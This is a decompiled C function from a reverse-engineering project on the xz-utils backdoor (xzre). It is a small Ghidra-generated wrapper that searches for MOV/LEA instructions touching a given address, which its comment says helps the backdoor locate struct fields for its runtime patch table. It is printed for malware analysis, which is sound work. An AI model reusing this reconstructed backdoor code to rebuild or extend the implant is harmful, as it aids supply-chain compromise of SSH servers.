// /home/kali/xzre-ghidra/xzregh/101120_find_instruction_with_mem_operand.c
// Function: find_instruction_with_mem_operand @ 0x101120
// Calling convention: unknown
// Prototype: undefined find_instruction_with_mem_operand(void)


/*
 * AutoDoc: Convenience wrapper that searches for MOV/LEA forms touching a specific address and reports the displacement. It feeds higher-level routines that locate struct fields for the backdoor's runtime patch table.
 */
#include "xzre_types.h"


undefined8
find_instruction_with_mem_operand
          (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  undefined8 uVar2;
  
  iVar1 = find_lea_instruction_with_mem_operand();
  if (iVar1 == 0) {
    uVar2 = find_instruction_with_mem_operand_ex(param_1,param_2,param_3,0x10b,param_4);
    return uVar2;
  }
  return 1;
}

